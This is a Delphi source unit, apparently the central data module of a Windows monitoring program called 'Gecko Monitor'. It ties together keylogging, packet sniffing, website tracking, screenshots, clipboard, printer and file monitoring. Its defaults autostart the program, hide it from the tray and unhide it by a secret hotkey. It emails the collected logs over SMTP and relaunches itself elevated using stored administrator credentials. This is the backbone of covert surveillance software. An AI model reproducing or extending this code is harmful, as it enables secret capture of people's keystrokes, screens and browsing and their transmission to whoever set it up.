@@ -1,0 +1,590 @@
+unit uDataModel;
+
+interface
+
+uses
+  Winapi.Windows, System.SysUtils, System.Classes, HotKeyManager,
+  uKeylogger, uSniffer, uSiteTracker, uScreenshotter,
+  uWindowFocusNotifier, uPrintersMonitor, uServiceManager, uSerialValidator,
+  uTrialUnlocker, uMailSender, uClipboardMonitor;
+
+type
+  TShortString = String[64];
+  TSettings = packed record
+                General     : packed record
+                                StartWithWindows: Boolean;
+                                AutoStartMonitor: Boolean;
+                                GeckoTray       : Boolean;
+                                FirstTime       : Boolean;
+                                ShowHideHotkey  : TShortCut;
+                                Password        : TShortString;
+                                Serial          : TSerial;
+                                Elevate         : Boolean;
+                                AdminUsername   : TShortString;
+                                AdminPassword   : TShortString;
+                              end;
+
+                Report      : packed record
+                                ReportMail    : Boolean;
+                                ResetLogs     : Boolean;
+                                ReportRecip   : TShortString;
+                                ReportSubject : TShortString;
+                                SMTPServer    : TShortString;
+                                SMTPPort      : Integer;
+                                SMTPUsername  : TShortString;
+                                SMTPPassword  : TShortString;
+                                SSLType       : Integer;
+                                ReportInterval: Integer;
+                              end;
+
+                Screenshots : packed record
+                                ScreenshotOnInterval: packed record
+                                                        Enabled : Boolean;
+                                                        Interval: Integer;
+                                                        ScrType : Integer;
+                                                      end;
+
+                                ScreenshotOnFocus   : packed record
+                                                        Enabled: Boolean;
+                                                        ScrType: Integer;
+                                                     end;
+                              end;
+
+                Keylogger   : packed record
+                                EmulateBackspace: Boolean;
+                              end;
+
+                Websites    : packed record
+                                IgnoreList: packed record
+                                              Count: Integer;
+                                            end;
+                              end;
+
+                Printers    : packed record
+                                Monitored: packed record
+                                             Count: Integer;
+                                           end;
+                              end;
+
+                Files       : packed record
+                                IgnoreList: packed record
+                                              Count: Integer;
+                                            end;
+                              end;
+              end;
+
+  TSettingsDynamic = packed record
+                       Websites : packed record
+                                    IgnoreList: packed record
+                                                  Items: TStringList;
+                                                end;
+                                  end;
+
+                       Printers  : packed record
+                                     Monitored: packed record
+                                                  Items: TStringList;
+                                                end;
+                                   end;
+
+                       Files    : packed record
+                                    IgnoreList: packed record
+                                                  Items: TStringList;
+                                                end;
+                                  end;
+                     end;
+
+  TSession = record
+               StartTime       : TDateTime;
+               EndTime         : TDateTime;
+               ScreenshotsTaken: Integer;
+               KeystrokesLogged: Integer;
+               WebsitesLogged  : Integer;
+               AppsLogged      : Integer;
+               PrintersLogged  : Integer;
+               ClipboardLogged : Integer;
+               FilesLogged     : Integer;
+             end;
+
+  TDataModel = class(TDataModule)
+    procedure DataModuleCreate(Sender: TObject);
+    procedure DataModuleDestroy(Sender: TObject);
+  private
+    const
+      FONTCOUNT = 4;
+      FONTLIST  : Array[0..FONTCOUNT - 1] of String = ('CALIBRI', 'CALIBRIB', 'CALIBRII', 'CALIBRIZ');
+
+    var
+      FSettingsFile   : String;
+      FSelfPath       : String;
+      FScreenshotsPath: String;
+      FStartTime      : DWORD;
+      FFonts          : Array[0..FONTCOUNT - 1] of THandle;
+
+    procedure InitVars;
+    procedure SnifferDataAvailable(Sender: TObject; const ABuffer : TByteArray; const ABufferSize : Integer);
+    procedure WebsiteIgnoreListChange(Sender: TObject);
+    procedure MonitoredPrintersListChange(Sender: TObject);
+    procedure FileIgnoreListChange(Sender: TObject);
+    procedure LoadFonts;
+    procedure UnloadFonts;
+  public
+    Settings           : TSettings;
+    SettingsDynamic    : TSettingsDynamic;
+    Keylogger          : TKeylogger;
+    Sniffer            : TSniffer;
+    SiteTracker        : TSiteTracker;
+    Screenshotter      : TScreenshotter;
+    WindowFocusNotifier: TWindowFocusNotifier;
+    PrintersMonitor    : TPrintersMonitor;
+    Session            : TSession;
+    ServiceManager     : TServiceManager;
+    TrialUnlocker      : TTrialUnlocker;
+    Mailer             : TMailSender;
+    ClipboardMonitor   : TClipboardMonitor;
+
+    procedure LoadDefaultSettings;
+    procedure SaveSettings;
+    procedure LoadSettings;
+
+    function IsSpoolerRunning: Boolean;
+
+    procedure AddWebsiteToIgnoreList(const AWebsite: String);
+    procedure DeleteWebIgnoreItem(const AIndex: Integer);
+    function MatchesWebIgnoreList(const ASite: String): Boolean;
+
+    procedure AddFileToIgnoreList(const AFile: String);
+    procedure DeleteFileIgnoreItem(const AIndex: Integer);
+    function MatchesFileIgnoreList(const AFile: String): Boolean;
+
+    procedure InitSession;
+
+    property SelfPath       : String read FSelfPath;
+    property SettingsFile   : String read FSettingsFile;
+    property ScreenshotsPath: String read FScreenshotsPath;
+  end;
+
+var
+  DataModel: TDataModel;
+
+implementation
+
+{%CLASSGROUP 'System.Classes.TPersistent'}
+
+{$R *.dfm}
+
+uses
+  {$IFDEF DEBUG} JclDebug, {$ENDIF}
+  Vcl.Forms, Vcl.Printers, Vcl.Dialogs,
+  uCommon, uEncryption, uInstanceController;
+
+{$I SitesIgnoreList.inc}
+
+procedure TDataModel.DataModuleCreate(Sender: TObject);
+var
+  pinfo: TProcessInformation;
+begin
+  InitVars;
+
+  LoadDefaultSettings;
+  LoadSettings;
+
+  if not IsUserAnAdmin then
+  begin
+    TInstanceController.UnregisterInstance;
+    if Settings.General.Elevate then
+      RunAs('.', String(Settings.General.AdminUsername), String(Settings.General.AdminPassword), ParamStr(0), pinfo);
+//    else
+//      MessageDlg('Please run Gecko Monitor under administrator privileges!', mtInformation, [mbOk], 0);
+
+    ExitProcess(0);
+  end;
+
+  LoadFonts;
+
+  ForceDirectories(DataModel.ScreenshotsPath);
+
+  Sniffer := TSniffer.Create;
+  Sniffer.OnDataAvailable := SnifferDataAvailable;
+  SiteTracker := TSiteTracker.Create;
+  Screenshotter := TScreenshotter.Create;
+  WindowFocusNotifier := TWindowFocusNotifier.Create;
+  PrintersMonitor := TPrintersMonitor.Create;
+  ServiceManager := TServiceManager.Create;
+  TrialUnlocker := TTrialUnlocker.Create(2 * 3600 * 1000); // 2 hours
+//  TrialUnlocker := TTrialUnlocker.Create(24 * 3600 * 1000); // 24 hours
+  Mailer := TMailSender.Create;
+  ClipboardMonitor := TClipboardMonitor.Create;
+end;
+
+procedure TDataModel.DataModuleDestroy(Sender: TObject);
+begin
+  ClipboardMonitor.Free;
+  Mailer.Free;
+  ServiceManager.Free;
+  PrintersMonitor.Free;
+  WindowFocusNotifier.Free;
+  Screenshotter.Free;
+  SiteTracker.Free;
+  Sniffer.Free;
+  TrialUnlocker.Free;
+
+  SaveSettings;
+  SettingsDynamic.Websites.IgnoreList.Items.Free;
+  SettingsDynamic.Printers.Monitored.Items.Free;
+  SettingsDynamic.Files.IgnoreList.Items.Free;
+
+  UnloadFonts;
+end;
+
+procedure TDataModel.InitVars;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  FStartTime := GetTickCount;
+
+  FSelfPath := IncludeTrailingPathDelimiter(ExtractFilePath(ParamStr(0)));
+  FSettingsFile := FSelfPath + 'settings.dat';
+  FScreenshotsPath := IncludeTrailingPathDelimiter(FSelfPath + 'screenshots');
+
+  SettingsDynamic.Websites.IgnoreList.Items := TStringList.Create;
+  SettingsDynamic.Printers.Monitored.Items := TStringList.Create;
+  SettingsDynamic.Files.IgnoreList.Items := TStringList.Create;
+
+  SettingsDynamic.Websites.IgnoreList.Items.OnChange := WebsiteIgnoreListChange;
+  SettingsDynamic.Printers.Monitored.Items.OnChange := MonitoredPrintersListChange;
+  SettingsDynamic.Files.IgnoreList.Items.OnChange := FileIgnoreListChange;
+end;
+
+procedure TDataModel.LoadDefaultSettings;
+var
+  C1: Integer;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  Settings.General.StartWithWindows := TRUE;
+  Settings.General.AutoStartMonitor := TRUE;
+  Settings.General.GeckoTray := FALSE;
+  Settings.General.FirstTime := TRUE;
+  Settings.General.ShowHideHotkey := 49227; // Ctrl + Alt + K
+  Settings.General.Password := '';
+  Settings.General.Serial := '';
+  Settings.General.Elevate := FALSE;
+  Settings.General.AdminUsername := '';
+  Settings.General.AdminPassword := '';
+
+  Settings.Report.ReportMail := FALSE;
+  Settings.Report.ResetLogs := FALSE;
+  Settings.Report.ReportRecip := '';
+  Settings.Report.ReportSubject := 'Gecko Monitor logs';
+  Settings.Report.SMTPServer := 'smtp.gmail.com';
+  Settings.Report.SMTPPort := 465;
+  Settings.Report.SMTPUsername := 'username@gmail.com';
+  Settings.Report.SMTPPassword := '';
+  Settings.Report.SSLType := 1;
+  Settings.Report.ReportInterval := 180;
+
+  Settings.Screenshots.ScreenshotOnInterval.Enabled := TRUE;
+  Settings.Screenshots.ScreenshotOnInterval.Interval := 300;
+  Settings.Screenshots.ScreenshotOnInterval.ScrType := 2;
+  Settings.Screenshots.ScreenshotOnFocus.Enabled := TRUE;
+  Settings.Screenshots.ScreenshotOnFocus.ScrType := 2;
+
+  Settings.Keylogger.EmulateBackspace := TRUE;
+
+  SettingsDynamic.Websites.IgnoreList.Items.Clear;
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*192.168.*.*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*127.0.0.*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*google.*/complete*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*safebrowsing-cache.google.com*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*notify*.dropbox.com/*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.png*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.jpg*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.jpeg*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.gif*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.js*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.xml*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.ico*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.crl*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.crf*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.bin*');
+  SettingsDynamic.Websites.IgnoreList.Items.Add('*.jnlp*');
+
+  SettingsDynamic.Printers.Monitored.Items.Clear;
+  for C1 := 0 to Printer.Printers.Count - 1 do
+    SettingsDynamic.Printers.Monitored.Items.Add(Printer.Printers[C1]);
+
+  SettingsDynamic.Files.IgnoreList.Items.Add(FSelfPath + '*');
+  SettingsDynamic.Files.IgnoreList.Items.Add('*treeinfo.wc');
+  SettingsDynamic.Files.IgnoreList.Items.Add('*AppData*');
+  SettingsDynamic.Files.IgnoreList.Items.Add('*crdownload*');
+end;
+
+procedure TDataModel.SaveSettings;
+var
+  ms  : TMemoryStream;
+  ems : TStream;
+  C1  : Integer;
+  len : Integer;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  ms := TMemoryStream.Create;
+  try
+    ms.WriteBuffer(Settings, SizeOf(TSettings));
+
+    // save website ignore list
+    for C1 := 0 to Settings.Websites.IgnoreList.Count - 1 do
+    begin
+      len := Length(SettingsDynamic.Websites.IgnoreList.Items[C1]) * SizeOf(Char);
+      ms.WriteBuffer(len, SizeOf(Integer));
+      ms.WriteBuffer(SettingsDynamic.Websites.IgnoreList.Items[C1][1], len);
+    end;
+
+    // save monitored printers list
+    for C1 := 0 to Settings.Printers.Monitored.Count - 1 do
+    begin
+      len := Length(SettingsDynamic.Printers.Monitored.Items[C1]) * SizeOf(Char);
+      ms.WriteBuffer(len, SizeOf(Integer));
+      ms.WriteBuffer(SettingsDynamic.Printers.Monitored.Items[C1][1], len);
+    end;
+
+    // save file ignore list
+    for C1 := 0 to Settings.Files.IgnoreList.Count - 1 do
+    begin
+      len := Length(SettingsDynamic.Files.IgnoreList.Items[C1]) * SizeOf(Char);
+      ms.WriteBuffer(len, SizeOf(Integer));
+      ms.WriteBuffer(SettingsDynamic.Files.IgnoreList.Items[C1][1], len);
+    end;
+
+    ms.Position := 0;
+    ems := TMemoryStream.Create;
+    try
+      TEncryption.Encrypt(ms, ems);
+      (ems as TMemoryStream).SaveToFile(FSettingsFile);
+    finally
+      ems.Free;
+    end;
+  finally
+    ms.Free;
+  end;
+end;
+
+procedure TDataModel.LoadSettings;
+var
+  fs     : TFileStream;
+  dms    : TStream;
+  C1     : Integer;
+  len    : Integer;
+  tmp    : String;
+  tmpint : Integer;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  if FileExists(FSettingsFile) then
+  begin
+    fs := TFileStream.Create(FSettingsFile, fmOpenRead);
+    try
+      fs.Position := 0;
+      dms := TMemoryStream.Create;
+      try
+        TEncryption.Decrypt(fs, dms);
+        dms.Position := 0;
+        dms.ReadBuffer(Settings, SizeOf(TSettings));
+
+        // load ignored websites list
+        tmpint := Settings.Websites.IgnoreList.Count;
+        SettingsDynamic.Websites.IgnoreList.Items.Clear;
+        for C1 := 0 to tmpint - 1 do
+        begin
+          dms.ReadBuffer(len, SizeOf(Integer));
+          SetLength(tmp, len div SizeOf(Char));
+          dms.ReadBuffer(tmp[1], len);
+          SettingsDynamic.Websites.IgnoreList.Items.Add(tmp);
+        end;
+
+        // load monitored printers list
+        tmpint := Settings.Printers.Monitored.Count;
+        SettingsDynamic.Printers.Monitored.Items.Clear;
+        for C1 := 0 to tmpint - 1 do
+        begin
+          dms.ReadBuffer(len, SizeOf(Integer));
+          SetLength(tmp, len div SizeOf(Char));
+          dms.ReadBuffer(tmp[1], len);
+          SettingsDynamic.Printers.Monitored.Items.Add(tmp);
+        end;
+
+        // load ignored files list
+        tmpint := Settings.Files.IgnoreList.Count;
+        SettingsDynamic.Files.IgnoreList.Items.Clear;
+        for C1 := 0 to tmpint - 1 do
+        begin
+          dms.ReadBuffer(len, SizeOf(Integer));
+          SetLength(tmp, len div SizeOf(Char));
+          dms.ReadBuffer(tmp[1], len);
+          SettingsDynamic.Files.IgnoreList.Items.Add(tmp);
+        end;
+      finally
+        dms.Free;
+      end;
+    finally
+      fs.Free;
+    end;
+  end;
+end;
+
+procedure TDataModel.SnifferDataAvailable(Sender: TObject; const ABuffer : TByteArray; const ABufferSize : Integer);
+var
+  stream : TMemoryStream;
+begin
+  stream := TMemoryStream.Create;
+  stream.WriteBuffer(ABuffer[0], ABufferSize);
+  stream.Position := 0;
+  SiteTracker.ParseData(stream);
+  stream.Free;
+end;
+
+procedure TDataModel.AddWebsiteToIgnoreList(const AWebsite: String);
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  if AWebsite <> '' then
+    SettingsDynamic.Websites.IgnoreList.Items.Add(AWebsite);
+end;
+
+procedure TDataModel.DeleteWebIgnoreItem(const AIndex: Integer);
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  if (AIndex >= 0) and
+     (AIndex < SettingsDynamic.Websites.IgnoreList.Items.Count) then
+    SettingsDynamic.Websites.IgnoreList.Items.Delete(AIndex);
+end;
+
+function TDataModel.MatchesWebIgnoreList(const ASite: String): Boolean;
+var
+  C1: Integer;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  for C1 := 0 to Settings.Websites.IgnoreList.Count - 1 do
+    if Match(ASite, SettingsDynamic.Websites.IgnoreList.Items[C1]) then
+      Exit(TRUE);
+
+  for C1 := Low(SITES_IGNORE_LIST) to High(SITES_IGNORE_LIST) do
+    if Match(ASite, SITES_IGNORE_LIST[C1]) then
+      Exit(TRUE);
+
+  Exit(FALSE);
+end;
+
+procedure TDataModel.WebsiteIgnoreListChange(Sender: TObject);
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  Settings.Websites.IgnoreList.Count := SettingsDynamic.Websites.IgnoreList.Items.Count;
+end;
+
+procedure TDataModel.MonitoredPrintersListChange(Sender: TObject);
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  Settings.Printers.Monitored.Count := SettingsDynamic.Printers.Monitored.Items.Count;
+end;
+
+procedure TDataModel.FileIgnoreListChange(Sender: TObject);
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  Settings.Files.IgnoreList.Count := SettingsDynamic.Files.IgnoreList.Items.Count;
+end;
+
+procedure TDataModel.LoadFonts;
+//
+// Load fonts for app
+//
+var
+  rs         : TResourceStream;
+  nbFontAdded: DWORD;
+  C1         : Integer;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  for C1 := Low(FONTLIST) to High(FONTLIST) do
+  begin
+    rs := TResourceStream.Create(HInstance, FONTLIST[C1], RT_RCDATA);
+    FFonts[C1] := AddFontMemResourceEx(rs.Memory, rs.Size, nil, @nbFontAdded);
+    rs.Free;
+  end;
+end;
+
+procedure TDataModel.UnloadFonts;
+//
+// Unload fonts
+//
+var
+  C1: Integer;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  for C1 := Low(FFonts) to High(FFonts) do
+    RemoveFontMemResourceEx(FFonts[C1]);
+end;
+
+function TDataModel.IsSpoolerRunning: Boolean;
+//
+// Check if Spooler service is running
+//
+var
+  oldState: Boolean;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  oldState := ServiceManager.Active;
+  if not oldState then
+    ServiceManager.Active := TRUE;
+  result := ServiceManager.ServiceByName['Spooler'].State = ssRunning;
+  if oldState <> ServiceManager.Active then
+    ServiceManager.Active := oldState;
+end;
+
+procedure TDataModel.AddFileToIgnoreList(const AFile: String);
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  if AFile <> '' then
+    SettingsDynamic.Files.IgnoreList.Items.Add(AFile);
+end;
+
+procedure TDataModel.DeleteFileIgnoreItem(const AIndex: Integer);
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  if (AIndex >= 0) and
+     (AIndex < SettingsDynamic.Files.IgnoreList.Items.Count) then
+    SettingsDynamic.Files.IgnoreList.Items.Delete(AIndex);
+end;
+
+function TDataModel.MatchesFileIgnoreList(const AFile: String): Boolean;
+var
+  C1: Integer;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  for C1 := 0 to Settings.Files.IgnoreList.Count - 1 do
+    if Match(AFile, SettingsDynamic.Files.IgnoreList.Items[C1], FALSE) then
+      Exit(TRUE);
+
+  Exit(FALSE);
+end;
+
+procedure TDataModel.InitSession;
+begin
+  {$IFDEF DEBUG} Debug(ModuleByLevel, ProcByLevel); {$ENDIF}
+
+  ZeroMemory(@Session, SizeOf(TSession));
+  Session.StartTime := Now;
+end;
+
+
+end.
+
